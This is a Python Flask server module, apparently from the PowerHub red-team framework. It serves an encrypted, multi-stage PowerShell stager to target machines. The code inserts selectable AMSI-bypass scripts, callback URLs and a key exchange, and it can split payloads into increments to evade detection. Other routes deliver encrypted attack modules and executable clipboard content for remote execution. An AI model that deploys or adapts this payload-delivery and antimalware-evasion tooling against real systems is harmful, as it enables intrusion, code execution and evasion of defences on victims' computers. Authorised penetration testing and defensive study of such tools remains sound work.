from base64 import b64encode
import binascii
import logging
import os
import random
import string

from flask import render_template, request, Response, Flask

from powerhub.tools import encrypt_rc4, encrypt_aes, compress
import powerhub.modules as phmod
from powerhub.stager import webdav_url, callback_urls, get_stage
from powerhub.directories import directories
from powerhub.dhkex import DH_G, DH_MODULUS, DH_ENDPOINT
from powerhub.parameters import param_collection
from powerhub import __version__

hidden_app = Flask(
    'hidden_app',
    template_folder=os.path.join(directories.BASE_DIR, 'templates'),
)
hidden_app.templates_auto_reload = True

log = logging.getLogger(__name__)


@hidden_app.add_template_filter
def debug(msg):
    """This is a function for debugging statements in jinja2 templates"""
    if log.getEffectiveLevel() == logging.DEBUG:
        return msg
    return ""


@hidden_app.add_template_filter
def rc4encrypt(msg):
    """This is a function for encrypting strings in jinja2 templates"""
    return b64encode(encrypt_rc4(msg.encode(), hidden_app.key)).decode()


@hidden_app.add_template_filter
def rc4byteencrypt(data):
    """This is a function for encrypting bytes in jinja2 templates

    data must be hexascii encoded.
    """
    encrypted = encrypt_rc4(b64encode(binascii.unhexlify(data)), hidden_app.key)
    return b64encode(encrypted).decode()


def get_stage3():
    minimal = param_collection['minimal']
    transport = param_collection['transport']

    powerhub_context = dict(
        modules=phmod.modules,
        callback_url=callback_urls()[transport],
        transport=transport,
        webdav_url=webdav_url(),
        key=hidden_app.key,
        VERSION=__version__,
        minimal=minimal,
    )

    stage3 = render_template(
        "powershell/powerhub.ps1",
        **powerhub_context,
    )

    return stage3


def get_profile():
    try:
        with open(os.path.join(directories.XDG_DATA_HOME, "profile.ps1"), "r") as f:
            profile = f.read()
    except Exception as e:
        log.error("Error while reading profile.ps1: %s" % str(e))
        profile = ""

    return profile


def get_clipboard_entry():
    try:
        clipboard_id = int(param_collection['clip-exec'])
        if clipboard_id < 0:
            return ""

        clipboard_entry = hidden_app.clipboard.entries[clipboard_id]
        if clipboard_entry.executable:
            clipboard_entry = clipboard_entry.content
        else:
            log.error(
                "Cannot include clipboard entry %d, "
                "because the executable flag is not set"
            )
            clipboard_entry = ""
    except (TypeError, IndexError):
        clipboard_entry = ""

    return clipboard_entry


@hidden_app.route('/')
def stager():
    """Load the stager"""
    log.debug("Building stage 1; arguments: %s" % request.args)

    stage3 = get_stage3()
    profile = get_profile()
    clipboard_entry = get_clipboard_entry()

    param_collection.parse_get_args_short(request.args)
    amsi_bypass = param_collection['amsi']
    amsi_bypass = os.path.join('powershell', 'amsi', amsi_bypass + '.ps1')

    kex = param_collection['kex']
    natural = param_collection['natural']
    transport = param_collection['transport']
    increment = request.args.get('increment')
    if increment:
        separator = '<#%s#>' % random.choices(string.ascii_letters, k=32)
    else:
        separator = ''

    key = hidden_app.key

    stager_context = dict(
        key=key,
        amsibypass=amsi_bypass,
        callback=callback_urls()[transport],
        kex=kex,
        DH_G=DH_G,
        DH_MODULUS=DH_MODULUS,
        dh_endpoint=DH_ENDPOINT,
        separator=separator,
    )

    result = get_stage(
        key,
        stage3_strings=[stage3, profile, clipboard_entry],
        context=stager_context,
        debug=(log.getEffectiveLevel() <= logging.DEBUG),
        natural=natural,
    )

    if increment:
        result = result.split(separator)[int(increment)]

    return Response(result, content_type='text/plain; charset=utf-8')


@hidden_app.route('/list')
def hub_modules():
    """Return list of hub modules"""

    context = {
        "modules": phmod.modules,
    }

    result = render_template(
        "powershell/modules.ps1",
        **context,
    ).encode()

    result = b64encode(encrypt_aes((result), hidden_app.key))
    return Response(result, content_type='text/plain; charset=utf-8')


@hidden_app.route('/module')
def load_module():
    """Load a single module"""

    if 'm' not in request.args:
        return Response('error')

    n = int(request.args.get('m'))

    if n < len(phmod.modules):
        phmod.modules[n].activate()
        code = phmod.modules[n].code

        if 'c' in request.args:
            encrypted = encrypt_aes(compress(code), hidden_app.key)
            resp = b64encode(encrypted),
        else:
            resp = b64encode(encrypt_aes(code, hidden_app.key)),

        return Response(
            resp,
            content_type='text/plain; charset=utf-8'
        )
    else:
        return Response("not found")
